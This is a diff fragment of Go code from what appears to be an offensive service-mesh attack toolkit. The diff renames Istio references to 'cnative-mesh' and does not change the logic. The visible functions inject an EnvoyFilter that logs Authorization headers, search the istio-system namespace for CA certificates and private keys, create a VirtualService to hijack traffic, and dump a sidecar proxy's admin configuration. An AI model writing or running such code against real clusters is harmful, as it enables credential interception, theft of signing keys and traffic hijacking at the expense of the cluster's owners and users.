@@ -18,10 +18,10 @@ import (
 )
 
 var (
-	istioVSGVR = schema.GroupVersionResource{
+	cnativeMeshVSGVR = schema.GroupVersionResource{
 		Group: "networking.istio.io", Version: "v1beta1", Resource: "virtualservices",
 	}
-	istioEnvoyFilterGVR = schema.GroupVersionResource{
+	cnativeMeshFilterGVR = schema.GroupVersionResource{
 		Group: "networking.istio.io", Version: "v1alpha3", Resource: "envoyfilters",
 	}
 )
@@ -29,9 +29,9 @@ var (
 // InjectXDSConfig creates an EnvoyFilter that intercepts authorization headers on the target service's sidecar.
 func InjectXDSConfig(ctx context.Context, dynClient dynamic.Interface, ns, targetService string, port int64) (string, error) {
 	var sb strings.Builder
-	sb.WriteString("Istio xDS Injection:\n")
+	sb.WriteString("cnative-mesh xDS Injection:\n")
 
-	envoyFilter := &unstructured.Unstructured{
+	cnativeMeshFilter := &unstructured.Unstructured{
 		Object: map[string]any{
 			"apiVersion": "networking.istio.io/v1alpha3",
 			"kind":       "EnvoyFilter",
@@ -67,8 +67,8 @@ func InjectXDSConfig(ctx context.Context, dynClient dynamic.Interface, ns, targe
 										map[string]any{
 											"name": "envoy.access_loggers.file",
 											"typed_config": map[string]any{
-												"@type":   "type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog",
-												"path":    "/dev/stdout",
+												"@type": "type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog",
+												"path":  "/dev/stdout",
 												"log_format": map[string]any{
 													"text_format_source": map[string]any{
 														"inline_string": "[INTERCEPT] %REQ(:METHOD)% %REQ(:PATH)% %REQ(:AUTHORITY)% %REQ(AUTHORIZATION)%\n",
@@ -116,7 +116,7 @@ end`,
 		},
 	}
 
-	_, err := dynClient.Resource(istioEnvoyFilterGVR).Namespace(ns).Create(ctx, envoyFilter, metav1.CreateOptions{})
+	_, err := dynClient.Resource(cnativeMeshFilterGVR).Namespace(ns).Create(ctx, cnativeMeshFilter, metav1.CreateOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  EnvoyFilter creation failed: %v\n", err)
 		return sb.String(), nil
@@ -130,7 +130,7 @@ end`,
 	return sb.String(), nil
 }
 
-// ExtractMTLSCerts searches for Istio CA certificates and private keys in the control plane namespace.
+// ExtractMTLSCerts searches for cnative-mesh CA certificates and private keys in the control plane namespace.
 func ExtractMTLSCerts(ctx context.Context) (string, error) {
 	config, err := rest.InClusterConfig()
 	if err != nil {
@@ -143,7 +143,7 @@ func ExtractMTLSCerts(ctx context.Context) (string, error) {
 	}
 
 	var sb strings.Builder
-	sb.WriteString("Istio mTLS Certificate Extraction:\n")
+	sb.WriteString("cnative-mesh mTLS Certificate Extraction:\n")
 
 	secrets, err := client.CoreV1().Secrets("istio-system").List(ctx, metav1.ListOptions{})
 	if err != nil {
@@ -220,7 +220,7 @@ func HijackTraffic(ctx context.Context, dynClient dynamic.Interface, ns, targetS
 		},
 	}
 
-	_, err := dynClient.Resource(istioVSGVR).Namespace(ns).Create(ctx, vs, metav1.CreateOptions{})
+	_, err := dynClient.Resource(cnativeMeshVSGVR).Namespace(ns).Create(ctx, vs, metav1.CreateOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  VirtualService creation failed: %v\n", err)
 		return sb.String(), nil
@@ -232,10 +232,10 @@ func HijackTraffic(ctx context.Context, dynClient dynamic.Interface, ns, targetS
 	return sb.String(), nil
 }
 
-// DumpEnvoyConfig queries a sidecar's Envoy admin API to extract clusters, listeners, and certificates.
-func DumpEnvoyConfig(ctx context.Context, podIP string) (string, error) {
+// DumpCnativeMeshConfig queries a sidecar's cnative-mesh proxy admin API to extract clusters, listeners, and certificates.
+func DumpCnativeMeshConfig(ctx context.Context, podIP string) (string, error) {
 	var sb strings.Builder
-	sb.WriteString("Envoy Admin Dump:\n")
+	sb.WriteString("cnative-mesh proxy Admin Dump:\n")
 
 	adminPort := "15000"
 	endpoints := []struct {
